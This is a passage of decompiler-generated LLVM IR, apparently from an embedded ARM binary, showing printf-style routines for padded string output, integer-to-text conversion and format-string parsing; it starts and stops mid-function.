  store i32 %arg4, i32* @r3, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_b020 = load i32, i32* @r4, align 4
  store i32 %v3_b020, i32* %stack_var_-24, align 4
  %v6_b020 = load i32, i32* @r5, align 4
  %v9_b020 = load i32, i32* @r6, align 4
  %v12_b020 = load i32, i32* @r7, align 4
  %v15_b020 = load i32, i32* @r8, align 4
  %v0_b024 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_b024, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %tmp50 = icmp slt i32 %v0_b024, 1
  br i1 %tmp50, label %dec_label_pc_b064, label %dec_label_pc_b040.preheader

dec_label_pc_b040.preheader:                      ; preds = %dec_label_pc_b020
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_b04022 = load i8, i8* %arg2, align 1
  %v2_b04424 = icmp eq i8 %v4_b04022, 0
  br i1 %v2_b04424, label %dec_label_pc_b04c, label %dec_label_pc_b03c

dec_label_pc_b03c:                                ; preds = %dec_label_pc_b040.preheader, %dec_label_pc_b03c
  %v0_b04c26 = phi i32 [ %v1_b03c, %dec_label_pc_b03c ], [ 0, %dec_label_pc_b040.preheader ]
  %v1_b03c = add i32 %v0_b04c26, 1
  store i32 %v1_b03c, i32* %r2.global-to-local, align 4
  %v2_b040 = add i32 %v1_b03c, %tmp
  %v3_b040 = inttoptr i32 %v2_b040 to i8*
  %v4_b040 = load i8, i8* %v3_b040, align 1
  %v2_b044 = icmp eq i8 %v4_b040, 0
  br i1 %v2_b044, label %dec_label_pc_b04c, label %dec_label_pc_b03c

dec_label_pc_b04c:                                ; preds = %dec_label_pc_b03c, %dec_label_pc_b040.preheader
  %v6_b0502.in = phi i8 [ %v4_b04022, %dec_label_pc_b040.preheader ], [ %v4_b040, %dec_label_pc_b03c ]
  %v6_b054 = phi i32 [ 0, %dec_label_pc_b040.preheader ], [ %v1_b03c, %dec_label_pc_b03c ]
  %v6_b0502 = zext i8 %v6_b0502.in to i32
  %v5_b050 = icmp sgt i32 %v0_b024, %v6_b054
  %v8_b054 = sub i32 %v0_b024, %v6_b054
  %v8_b054.v6_b0502 = select i1 %v5_b050, i32 %v8_b054, i32 %v6_b0502
  store i32 %v8_b054.v6_b0502, i32* @r4, align 4
  %v1_b058 = and i32 %arg4, 2
  %v2_b058 = icmp eq i32 %v1_b058, 0
  br i1 %v2_b058, label %dec_label_pc_b064, label %dec_label_pc_b068

dec_label_pc_b064:                                ; preds = %dec_label_pc_b020, %dec_label_pc_b04c
  %v0_b088732 = phi i32 [ %v8_b054.v6_b0502, %dec_label_pc_b04c ], [ %v0_b024, %dec_label_pc_b020 ]
  br label %dec_label_pc_b068

dec_label_pc_b068:                                ; preds = %dec_label_pc_b04c, %dec_label_pc_b064
  %v0_b0887 = phi i32 [ %v0_b088732, %dec_label_pc_b064 ], [ %v8_b054.v6_b0502, %dec_label_pc_b04c ]
  %storemerge = phi i32 [ 32, %dec_label_pc_b064 ], [ 48, %dec_label_pc_b04c ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_b068 = urem i32 %arg4, 2
  %v2_b068 = icmp eq i32 %v1_b068, 0
  store i32 0, i32* @r6, align 4
  br i1 %v2_b068, label %dec_label_pc_b088.preheader, label %dec_label_pc_b0a4.preheader

dec_label_pc_b088.preheader:                      ; preds = %dec_label_pc_b068
  %tmp51 = icmp slt i32 %v0_b0887, 1
  br i1 %tmp51, label %dec_label_pc_b0a4.preheader, label %dec_label_pc_b07c

dec_label_pc_b07c:                                ; preds = %dec_label_pc_b088.preheader, %dec_label_pc_b07c
  %v0_b09017 = phi i32 [ %v0_b090, %dec_label_pc_b07c ], [ %storemerge, %dec_label_pc_b088.preheader ]
  %v0_b08c16 = phi i32 [ %v0_b08c, %dec_label_pc_b07c ], [ %arg1, %dec_label_pc_b088.preheader ]
  %v2_b07c = inttoptr i32 %v0_b08c16 to i32*
  %v3_b07c = call i32 @function_afd8(i32* %v2_b07c, i32 %v0_b09017)
  %v0_b080 = load i32, i32* @r6, align 4
  %v1_b080 = add i32 %v0_b080, 1
  store i32 %v1_b080, i32* @r6, align 4
  %v0_b084 = load i32, i32* @r4, align 4
  %v1_b084 = add i32 %v0_b084, -1
  store i32 %v1_b084, i32* @r4, align 4
  %v0_b08c = load i32, i32* @r7, align 4
  %v0_b090 = load i32, i32* @r8, align 4
  %tmp52 = icmp slt i32 %v1_b084, 1
  br i1 %tmp52, label %dec_label_pc_b0a4.preheader.loopexit, label %dec_label_pc_b07c

dec_label_pc_b0a4.preheader.loopexit:             ; preds = %dec_label_pc_b07c
  %v0_b0a462.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_b0a4.preheader

dec_label_pc_b0a4.preheader:                      ; preds = %dec_label_pc_b0a4.preheader.loopexit, %dec_label_pc_b088.preheader, %dec_label_pc_b068
  %v0_b0cc5776 = phi i32 [ %storemerge, %dec_label_pc_b068 ], [ %storemerge, %dec_label_pc_b088.preheader ], [ %v0_b090, %dec_label_pc_b0a4.preheader.loopexit ]
  %v0_b0c45474 = phi i32 [ %v0_b0887, %dec_label_pc_b068 ], [ %v0_b0887, %dec_label_pc_b088.preheader ], [ %v1_b084, %dec_label_pc_b0a4.preheader.loopexit ]
  %v0_b0a462 = phi i32 [ %tmp, %dec_label_pc_b068 ], [ %tmp, %dec_label_pc_b088.preheader ], [ %v0_b0a462.pre, %dec_label_pc_b0a4.preheader.loopexit ]
  %v0_b0d839.ph = phi i32 [ 0, %dec_label_pc_b068 ], [ 0, %dec_label_pc_b088.preheader ], [ %v1_b080, %dec_label_pc_b0a4.preheader.loopexit ]
  %v0_b0ac.ph = phi i32 [ %arg1, %dec_label_pc_b068 ], [ %arg1, %dec_label_pc_b088.preheader ], [ %v0_b08c, %dec_label_pc_b0a4.preheader.loopexit ]
  %v1_b0a463 = inttoptr i32 %v0_b0a462 to i8*
  %v2_b0a464 = load i8, i8* %v1_b0a463, align 1
  %v3_b0a465 = zext i8 %v2_b0a464 to i32
  store i32 %v3_b0a465, i32* @r3, align 4
  %v2_b0a866 = icmp eq i8 %v2_b0a464, 0
  %v1_b0b067 = add i32 %v0_b0a462, 1
  store i32 %v1_b0b067, i32* @r5, align 4
  br i1 %v2_b0a866, label %dec_label_pc_b0c4.preheader, label %dec_label_pc_b09c

dec_label_pc_b09c:                                ; preds = %dec_label_pc_b0a4.preheader, %dec_label_pc_b09c
  %v3_b0a469 = phi i32 [ %v3_b0a4, %dec_label_pc_b09c ], [ %v3_b0a465, %dec_label_pc_b0a4.preheader ]
  %v0_b0ac68 = phi i32 [ %v0_b0ac.pre, %dec_label_pc_b09c ], [ %v0_b0ac.ph, %dec_label_pc_b0a4.preheader ]
  %v2_b09c = inttoptr i32 %v0_b0ac68 to i32*
  %v3_b09c = call i32 @function_afd8(i32* %v2_b09c, i32 %v3_b0a469)
  %v0_b0a0 = load i32, i32* @r6, align 4
  %v1_b0a0 = add i32 %v0_b0a0, 1
  store i32 %v1_b0a0, i32* @r6, align 4
  %v0_b0ac.pre = load i32, i32* @r7, align 4
  %v0_b0a4 = load i32, i32* @r5, align 4
  %v1_b0a4 = inttoptr i32 %v0_b0a4 to i8*
  %v2_b0a4 = load i8, i8* %v1_b0a4, align 1
  %v3_b0a4 = zext i8 %v2_b0a4 to i32
  store i32 %v3_b0a4, i32* @r3, align 4
  %v2_b0a8 = icmp eq i8 %v2_b0a4, 0
  %v1_b0b0 = add i32 %v0_b0a4, 1
  store i32 %v1_b0b0, i32* @r5, align 4
  br i1 %v2_b0a8, label %dec_label_pc_b0a4.dec_label_pc_b0c4.preheader_crit_edge, label %dec_label_pc_b09c

dec_label_pc_b0a4.dec_label_pc_b0c4.preheader_crit_edge: ; preds = %dec_label_pc_b09c
  %v0_b0c454.pre = load i32, i32* @r4, align 4
  %v0_b0cc57.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_b0c4.preheader

dec_label_pc_b0c4.preheader:                      ; preds = %dec_label_pc_b0a4.dec_label_pc_b0c4.preheader_crit_edge, %dec_label_pc_b0a4.preheader
  %v0_b0cc57 = phi i32 [ %v0_b0cc57.pre, %dec_label_pc_b0a4.dec_label_pc_b0c4.preheader_crit_edge ], [ %v0_b0cc5776, %dec_label_pc_b0a4.preheader ]
  %v0_b0c454 = phi i32 [ %v0_b0c454.pre, %dec_label_pc_b0a4.dec_label_pc_b0c4.preheader_crit_edge ], [ %v0_b0c45474, %dec_label_pc_b0a4.preheader ]
  %v0_b0d839.lcssa = phi i32 [ %v1_b0a0, %dec_label_pc_b0a4.dec_label_pc_b0c4.preheader_crit_edge ], [ %v0_b0d839.ph, %dec_label_pc_b0a4.preheader ]
  %v0_b0ac.lcssa = phi i32 [ %v0_b0ac.pre, %dec_label_pc_b0a4.dec_label_pc_b0c4.preheader_crit_edge ], [ %v0_b0ac.ph, %dec_label_pc_b0a4.preheader ]
  %v1_b0d058 = add i32 %v0_b0c454, -1
  store i32 %v1_b0d058, i32* @r4, align 4
  %tmp5359 = icmp slt i32 %v0_b0c454, 1
  br i1 %tmp5359, label %dec_label_pc_b0d8, label %dec_label_pc_b0bc

dec_label_pc_b0bc:                                ; preds = %dec_label_pc_b0c4.preheader, %dec_label_pc_b0bc
  %v0_b0cc61 = phi i32 [ %v0_b0cc, %dec_label_pc_b0bc ], [ %v0_b0cc57, %dec_label_pc_b0c4.preheader ]
  %v0_b0c860 = phi i32 [ %v0_b0c8.pre, %dec_label_pc_b0bc ], [ %v0_b0ac.lcssa, %dec_label_pc_b0c4.preheader ]
  %v2_b0bc = inttoptr i32 %v0_b0c860 to i32*
  %v3_b0bc = call i32 @function_afd8(i32* %v2_b0bc, i32 %v0_b0cc61)
  %v0_b0c0 = load i32, i32* @r6, align 4
  %v1_b0c0 = add i32 %v0_b0c0, 1
  store i32 %v1_b0c0, i32* @r6, align 4
  %v0_b0c8.pre = load i32, i32* @r7, align 4
  %v0_b0c4 = load i32, i32* @r4, align 4
  %v0_b0cc = load i32, i32* @r8, align 4
  %v1_b0d0 = add i32 %v0_b0c4, -1
  store i32 %v1_b0d0, i32* @r4, align 4
  %tmp53 = icmp slt i32 %v0_b0c4, 1
  br i1 %tmp53, label %dec_label_pc_b0d8, label %dec_label_pc_b0bc

dec_label_pc_b0d8:                                ; preds = %dec_label_pc_b0bc, %dec_label_pc_b0c4.preheader
  %v0_b0d8.lcssa = phi i32 [ %v0_b0d839.lcssa, %dec_label_pc_b0c4.preheader ], [ %v1_b0c0, %dec_label_pc_b0bc ]
  %v2_b0dc = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_b0dc, i32* @r4, align 4
  store i32 %v6_b020, i32* @r5, align 4
  store i32 %v9_b020, i32* @r6, align 4
  store i32 %v12_b020, i32* @r7, align 4
  store i32 %v15_b020, i32* @r8, align 4
  ret i32 %v0_b0d8.lcssa

; uselistorder directives
  uselistorder i32 %v0_b0c454, { 1, 0 }
  uselistorder i32 %v3_b0a4, { 1, 0 }
  uselistorder i32 %v0_b0ac.pre, { 1, 0 }
  uselistorder i32 %v0_b0ac.ph, { 1, 0 }
  uselistorder i32 %v0_b0a462, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0, 3 }
  uselistorder i32 %v8_b054.v6_b0502, { 0, 2, 1 }
  uselistorder i32 %v6_b054, { 1, 0 }
  uselistorder i32 %v1_b03c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_b024, { 1, 3, 0, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_b0bc, { 1, 0 }
  uselistorder label %dec_label_pc_b09c, { 1, 0 }
  uselistorder label %dec_label_pc_b07c, { 1, 0 }
  uselistorder label %dec_label_pc_b068, { 1, 0 }
  uselistorder label %dec_label_pc_b064, { 1, 0 }
  uselistorder label %dec_label_pc_b03c, { 1, 0 }
}

define i32 @function_b0e4() local_unnamed_addr {
dec_label_pc_b0e4:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-41 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %tmp40 = call i32 @__decompiler_undefined_function_0()
  %v3_b0e4 = load i32, i32* @r4, align 4
  %v6_b0e4 = load i32, i32* @r5, align 4
  %v9_b0e4 = load i32, i32* @r6, align 4
  %v12_b0e4 = load i32, i32* @r7, align 4
  %v15_b0e4 = load i32, i32* @r8, align 4
  %v21_b0e4 = load i32, i32* @sl, align 4
  %v0_b0e8 = load i32, i32* @r1, align 4
  store i32 %v0_b0e8, i32* @r4, align 4
  %v1_b0e8 = icmp slt i32 %v0_b0e8, 0
  %v2_b0e8 = icmp eq i32 %v0_b0e8, 0
  %v0_b0f0 = load i32, i32* @r2, align 4
  store i32 %v0_b0f0, i32* @r6, align 4
  %v0_b0f4 = load i32, i32* @r0, align 4
  store i32 %v0_b0f4, i32* %fp.global-to-local, align 4
  store i32 %tmp40, i32* @r7, align 4
  store i32 %tmp29, i32* %sb.global-to-local, align 4
  br i1 %v2_b0e8, label %dec_label_pc_b104, label %dec_label_pc_b124

dec_label_pc_b104:                                ; preds = %dec_label_pc_b0e4
  store i32 %tmp40, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-52, align 4
  %v4_b11c = bitcast i32* %stack_var_-52 to i8*
  %v5_b11c = call i32 @function_b020(i32 %v0_b0f4, i8* %v4_b11c, i32 %tmp40, i32 %tmp29)
  br label %dec_label_pc_b204

dec_label_pc_b124:                                ; preds = %dec_label_pc_b0e4
  %v0_b124 = load i32, i32* @r3, align 4
  %v2_b124 = icmp eq i32 %v0_b124, 0
  br i1 %v2_b124, label %bb43, label %bb

bb:                                               ; preds = %dec_label_pc_b124
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_b124, %bb
  %v0_b134.pr = phi i32 [ 0, %dec_label_pc_b124 ], [ 1, %bb ]
  %v7_b12c = icmp eq i32 %v0_b0f0, 10
  br i1 %v7_b12c, label %bb44, label %.thread

.thread:                                          ; preds = %bb43
  br label %dec_label_pc_b150

bb44:                                             ; preds = %bb43
  %v2_b134 = icmp eq i32 %v0_b134.pr, 0
  br i1 %v2_b134, label %dec_label_pc_b150, label %dec_label_pc_b13c

dec_label_pc_b13c:                                ; preds = %bb44
  br i1 %v1_b0e8, label %.thread26, label %dec_label_pc_b150

.thread26:                                        ; preds = %dec_label_pc_b13c
  %v4_b140 = sub i32 0, %v0_b0e8
  store i32 %v4_b140, i32* @r4, align 4
  br label %dec_label_pc_b150

dec_label_pc_b150:                                ; preds = %bb44, %.thread, %dec_label_pc_b13c, %.thread26
  %v0_b1987 = phi i32 [ %v4_b140, %.thread26 ], [ %v0_b0e8, %dec_label_pc_b13c ], [ %v0_b0e8, %.thread ], [ %v0_b0e8, %bb44 ]
  %storemerge27 = phi i32 [ 1, %.thread26 ], [ 0, %dec_label_pc_b13c ], [ 0, %.thread ], [ 0, %bb44 ]
  store i32 %storemerge27, i32* @r8, align 4
  %v2_b154 = ptrtoint i32* %stack_var_-41 to i32
  store i32 %v2_b154, i32* %r2.global-to-local, align 4
  %v1_b158 = add i32 %tmp, -58
  store i32 %v1_b158, i32* @sl, align 4
  store i32 0, i32* @r3, align 4
  store i32 0, i32* %stack_var_-41, align 4
  %v2_b1946 = icmp eq i32 %v0_b1987, 0
  store i32 %v2_b154, i32* @r5, align 4
  br i1 %v2_b1946, label %dec_label_pc_b1a8, label %dec_label_pc_b168

dec_label_pc_b168:                                ; preds = %dec_label_pc_b150, %dec_label_pc_b194
  %v8_b174 = phi i32 [ %v0_b19c, %dec_label_pc_b194 ], [ %v0_b0f0, %dec_label_pc_b150 ]
  %v0_b19811 = phi i32 [ %v0_b188, %dec_label_pc_b194 ], [ %v0_b1987, %dec_label_pc_b150 ]
  %v2_b168 = call i32 @function_b5a4(i32 %v0_b19811, i32 %v8_b174)
  %v7_b174 = icmp slt i32 %v8_b174, 10
  br i1 %v7_b174, label %dec_label_pc_b194, label %bb45

bb45:                                             ; preds = %dec_label_pc_b168
  %v9_b174 = load i32, i32* @sl, align 4
  %v10_b174 = add i32 %v9_b174, %v8_b174
  br label %dec_label_pc_b194

dec_label_pc_b194:                                ; preds = %dec_label_pc_b168, %bb45
  %v0_b178 = phi i32 [ %v8_b174, %dec_label_pc_b168 ], [ %v10_b174, %bb45 ]
  %v1_b178 = add i32 %v0_b178, 48
  store i32 %v1_b178, i32* @r3, align 4
  %v0_b17c = load i32, i32* @r4, align 4
  store i32 %v0_b17c, i32* @r0, align 4
  %v1_b180 = trunc i32 %v1_b178 to i8
  %v2_b180 = load i32, i32* @r5, align 4
  %v3_b180 = add i32 %v2_b180, -1
  %v4_b180 = inttoptr i32 %v3_b180 to i8*
  store i8 %v1_b180, i8* %v4_b180, align 1
  %v5_b180 = load i32, i32* @r5, align 4
  %v6_b180 = add i32 %v5_b180, -1
  store i32 %v6_b180, i32* @r5, align 4
  %v0_b184 = load i32, i32* @r6, align 4
  store i32 %v0_b184, i32* @r1, align 4
  %v0_b188 = call i32 @function_b4a8()
  %v0_b18c = load i32, i32* @r5, align 4
  store i32 %v0_b18c, i32* %r2.global-to-local, align 4
  store i32 %v0_b188, i32* @r4, align 4
  %v2_b194 = icmp eq i32 %v0_b188, 0
  %v0_b19c = load i32, i32* @r6, align 4
  br i1 %v2_b194, label %dec_label_pc_b194.dec_label_pc_b1a8_crit_edge, label %dec_label_pc_b168

dec_label_pc_b194.dec_label_pc_b1a8_crit_edge:    ; preds = %dec_label_pc_b194
  %v0_b1a8.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_b1a8

dec_label_pc_b1a8:                                ; preds = %dec_label_pc_b194.dec_label_pc_b1a8_crit_edge, %dec_label_pc_b150
  %v2_b1e0 = phi i32 [ %v0_b18c, %dec_label_pc_b194.dec_label_pc_b1a8_crit_edge ], [ %v2_b154, %dec_label_pc_b150 ]
  %v1_b1ac = phi i32 [ %v0_b1a8.pre, %dec_label_pc_b194.dec_label_pc_b1a8_crit_edge ], [ %storemerge27, %dec_label_pc_b150 ]
  %v2_b1a8 = icmp eq i32 %v1_b1ac, 0
  br i1 %v2_b1a8, label %bb46, label %dec_label_pc_b1b4

bb46:                                             ; preds = %dec_label_pc_b1a8
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_b1ec

dec_label_pc_b1b4:                                ; preds = %dec_label_pc_b1a8
  %v0_b1b4 = load i32, i32* @r7, align 4
  %v2_b1b4 = icmp eq i32 %v0_b1b4, 0
  br i1 %v2_b1b4, label %dec_label_pc_b1dc, label %dec_label_pc_b1bc

dec_label_pc_b1bc:                                ; preds = %dec_label_pc_b1b4
  %v0_b1bc = load i32, i32* %sb.global-to-local, align 4
  %v1_b1bc = and i32 %v0_b1bc, 2
  %v2_b1bc = icmp eq i32 %v1_b1bc, 0
  br i1 %v2_b1bc, label %dec_label_pc_b1dc, label %dec_label_pc_b1c4

dec_label_pc_b1c4:                                ; preds = %dec_label_pc_b1bc
  %v0_b1c4 = load i32, i32* %fp.global-to-local, align 4
  %v2_b1cc = inttoptr i32 %v0_b1c4 to i32*
  %v3_b1cc = call i32 @function_afd8(i32* %v2_b1cc, i32 45)
  %v0_b1d0 = load i32, i32* @r7, align 4
  %v1_b1d0 = add i32 %v0_b1d0, -1
  store i32 %v1_b1d0, i32* @r7, align 4
  store i32 1, i32* @r4, align 4
  %v0_b1f0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_b1ec

dec_label_pc_b1dc:                                ; preds = %dec_label_pc_b1bc, %dec_label_pc_b1b4
  %v3_b1e0 = add i32 %v2_b1e0, -1
  %v4_b1e0 = inttoptr i32 %v3_b1e0 to i8*
  store i8 45, i8* %v4_b1e0, align 1
  %v0_b1e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b1e4 = add i32 %v0_b1e4, -1
  store i32 %v1_b1e4, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_b1ec

dec_label_pc_b1ec:                                ; preds = %bb46, %dec_label_pc_b1c4, %dec_label_pc_b1dc
  %v0_b1f0 = phi i32 [ %v2_b1e0, %bb46 ], [ %v0_b1f0.pre, %dec_label_pc_b1c4 ], [ %v1_b1e4, %dec_label_pc_b1dc ]
  %v0_b1ec = load i32, i32* %fp.global-to-local, align 4
  %v0_b1f4 = load i32, i32* @r7, align 4
  store i32 %v0_b1f4, i32* %r2.global-to-local, align 4
  %v0_b1f8 = load i32, i32* %sb.global-to-local, align 4
  %v4_b1fc = inttoptr i32 %v0_b1f0 to i8*
  %v5_b1fc = call i32 @function_b020(i32 %v0_b1ec, i8* %v4_b1fc, i32 %v0_b1f4, i32 %v0_b1f8)
  %v1_b200 = load i32, i32* @r4, align 4
  %v2_b200 = add i32 %v1_b200, %v5_b1fc
  br label %dec_label_pc_b204

dec_label_pc_b204:                                ; preds = %dec_label_pc_b104, %dec_label_pc_b1ec
  %storemerge = phi i32 [ %v5_b11c, %dec_label_pc_b104 ], [ %v2_b200, %dec_label_pc_b1ec ]
  store i32 %v3_b0e4, i32* @r4, align 4
  store i32 %v6_b0e4, i32* @r5, align 4
  store i32 %v9_b0e4, i32* @r6, align 4
  store i32 %v12_b0e4, i32* @r7, align 4
  store i32 %v15_b0e4, i32* @r8, align 4
  store i32 %v21_b0e4, i32* @sl, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_b188, { 1, 2, 0 }
  uselistorder i32 %v8_b174, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b0e8, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %tmp40, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32, i32)* @function_b5a4, { 7, 1, 0, 6, 11, 10, 9, 8, 3, 5, 4, 2 }
  uselistorder label %dec_label_pc_b204, { 1, 0 }
  uselistorder label %dec_label_pc_b1ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b194, { 1, 0 }
  uselistorder label %dec_label_pc_b168, { 1, 0 }
  uselistorder label %dec_label_pc_b150, { 3, 2, 0, 1 }
  uselistorder label %bb43, { 1, 0 }
}

define i32 @function_b210(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10) local_unnamed_addr {
dec_label_pc_b210:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-42 = alloca i32, align 4
  %v3_b210 = load i32, i32* @r4, align 4
  %v6_b210 = load i32, i32* @r5, align 4
  %v9_b210 = load i32, i32* @r6, align 4
  %v12_b210 = load i32, i32* @r7, align 4
  %v15_b210 = load i32, i32* @r8, align 4
  %v18_b210 = load i32, i32* @sb, align 4
  %v21_b210 = load i32, i32* @sl, align 4
  %v24_b210 = load i32, i32* @fp, align 4
  store i32 0, i32* @r5, align 4
  %v0_b21c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_b21c, i32* @r6, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  store i32 10, i32* @sl, align 4
  %v2_b22c = ptrtoint i32* %stack_var_-42 to i32
  store i32 97, i32* @r8, align 4
  %v0_b238 = load i32, i32* %r2.global-to-local, align 4
  %v1_b3bc21 = inttoptr i32 %arg2 to i8*
  %v2_b3bc22 = load i8, i8* %v1_b3bc21, align 1
  %v3_b3bc23 = zext i8 %v2_b3bc22 to i32
  store i32 %v3_b3bc23, i32* @r3, align 4
  %v2_b3c024 = icmp eq i8 %v2_b3bc22, 0
  br i1 %v2_b3c024, label %dec_label_pc_b3c8, label %dec_label_pc_b240.lr.ph

dec_label_pc_b240.lr.ph:                          ; preds = %dec_label_pc_b210
  %v5_b238 = inttoptr i32 %v0_b238 to i8*
  br label %dec_label_pc_b240

dec_label_pc_b240:                                ; preds = %dec_label_pc_b240.lr.ph, %dec_label_pc_b3b8
  %v0_b3d446 = phi i32 [ 0, %dec_label_pc_b240.lr.ph ], [ %v0_b3d445, %dec_label_pc_b3b8 ]
  %v0_b248 = phi i32 [ %arg2, %dec_label_pc_b240.lr.ph ], [ %v1_b3b8, %dec_label_pc_b3b8 ]
  %v0_b240 = phi i32 [ %v3_b3bc23, %dec_label_pc_b240.lr.ph ], [ %v3_b3bc, %dec_label_pc_b3b8 ]
  %stack_var_-52.325 = phi i8* [ %v5_b238, %dec_label_pc_b240.lr.ph ], [ %stack_var_-52.2, %dec_label_pc_b3b8 ]
  %v7_b240 = icmp eq i32 %v0_b240, 37
  br i1 %v7_b240, label %dec_label_pc_b248, label %dec_label_pc_b3a8

dec_label_pc_b248:                                ; preds = %dec_label_pc_b240
  %v1_b248 = add i32 %v0_b248, 1
  %v2_b248 = inttoptr i32 %v1_b248 to i8*
  %v3_b248 = load i8, i8* %v2_b248, align 1
  %v4_b248 = zext i8 %v3_b248 to i32
  store i32 %v4_b248, i32* @r3, align 4
  store i32 %v1_b248, i32* @r4, align 4
  %v2_b24c = icmp eq i8 %v3_b248, 0
  br i1 %v2_b24c, label %dec_label_pc_b3c8.loopexit, label %dec_label_pc_b254

dec_label_pc_b254:                                ; preds = %dec_label_pc_b248
  %v7_b254 = icmp eq i8 %v3_b248, 37
  br i1 %v7_b254, label %dec_label_pc_b3a8, label %dec_label_pc_b25c

dec_label_pc_b25c:                                ; preds = %dec_label_pc_b254
  %v7_b25c = icmp eq i8 %v3_b248, 45
  br i1 %v7_b25c, label %bb65, label %bb

bb:                                               ; preds = %dec_label_pc_b25c
  %v1_b260 = load i32, i32* @r7, align 4
  br label %dec_label_pc_b278.preheader

bb65:                                             ; preds = %dec_label_pc_b25c
  %v2_b264 = add i32 %v0_b248, 2
  store i32 %v2_b264, i32* @r4, align 4
  br label %dec_label_pc_b278.preheader

dec_label_pc_b278.preheader:                      ; preds = %bb, %bb65
  %storemerge48 = phi i32 [ %v1_b260, %bb ], [ 1, %bb65 ]
  %v0_b27813 = phi i32 [ %v1_b248, %bb ], [ %v2_b264, %bb65 ]
  store i32 %storemerge48, i32* %r0.global-to-local, align 4
  %v1_b27814 = inttoptr i32 %v0_b27813 to i8*
  %v2_b27815 = load i8, i8* %v1_b27814, align 1
  %v7_b27c19 = icmp eq i8 %v2_b27815, 48
  br i1 %v7_b27c19, label %dec_label_pc_b270, label %dec_label_pc_b284

dec_label_pc_b270:                                ; preds = %dec_label_pc_b278.preheader, %dec_label_pc_b270
  %v0_b274 = phi i32 [ %v1_b274, %dec_label_pc_b270 ], [ %storemerge48, %dec_label_pc_b278.preheader ]
  %v0_b270 = phi i32 [ %v1_b270, %dec_label_pc_b270 ], [ %v0_b27813, %dec_label_pc_b278.preheader ]
  %v1_b270 = add i32 %v0_b270, 1
  store i32 %v1_b270, i32* @r4, align 4
  %v1_b274 = or i32 %v0_b274, 2
  store i32 %v1_b274, i32* %r0.global-to-local, align 4
  %v1_b278 = inttoptr i32 %v1_b270 to i8*
  %v2_b278 = load i8, i8* %v1_b278, align 1
  %v7_b27c = icmp eq i8 %v2_b278, 48
  br i1 %v7_b27c, label %dec_label_pc_b270, label %dec_label_pc_b284

dec_label_pc_b284:                                ; preds = %dec_label_pc_b270, %dec_label_pc_b278.preheader
  %v0_b29438 = phi i32 [ %v0_b27813, %dec_label_pc_b278.preheader ], [ %v1_b270, %dec_label_pc_b270 ]
  %v0_b2b8 = phi i32 [ %storemerge48, %dec_label_pc_b278.preheader ], [ %v1_b274, %dec_label_pc_b270 ]
  %v0_b284 = load i32, i32* @r7, align 4
  store i32 %v0_b284, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_b294

dec_label_pc_b28c:                                ; preds = %dec_label_pc_b294
  %v0_b28c = load i32, i32* @sl, align 4
  %v3_b28c = mul i32 %v0_b28c, %v1_b28c
  %v4_b28c = add i32 %v3_b28c, %v1_b298
  store i32 %v4_b28c, i32* %r2.global-to-local, align 4
  %v1_b290 = add i32 %v0_b290, 1
  store i32 %v1_b290, i32* @r4, align 4
  br label %dec_label_pc_b294

dec_label_pc_b294:                                ; preds = %dec_label_pc_b284, %dec_label_pc_b28c
  %v1_b28c = phi i32 [ %v0_b284, %dec_label_pc_b284 ], [ %v4_b28c, %dec_label_pc_b28c ]
  %v0_b290 = phi i32 [ %v0_b29438, %dec_label_pc_b284 ], [ %v1_b290, %dec_label_pc_b28c ]
  %v1_b294 = inttoptr i32 %v0_b290 to i8*
  %v2_b294 = load i8, i8* %v1_b294, align 1
  %v3_b294 = zext i8 %v2_b294 to i32
  %v1_b298 = add nsw i32 %v3_b294, -48
  %v1_b29c = urem i32 %v1_b298, 256
  %tmp70 = icmp ult i32 %v1_b29c, 10
  br i1 %tmp70, label %dec_label_pc_b28c, label %dec_label_pc_b2a8

dec_label_pc_b2a8:                                ; preds = %dec_label_pc_b294
  %v7_b2a8 = icmp eq i8 %v2_b294, 115
  br i1 %v7_b2a8, label %dec_label_pc_b2b0, label %dec_label_pc_b2cc

dec_label_pc_b2b0:                                ; preds = %dec_label_pc_b2a8
  %v1_b2b4 = bitcast i8* %stack_var_-52.325 to i32*
  %v2_b2b4 = load i32, i32* %v1_b2b4, align 4
  br label %dec_label_pc_b3a0

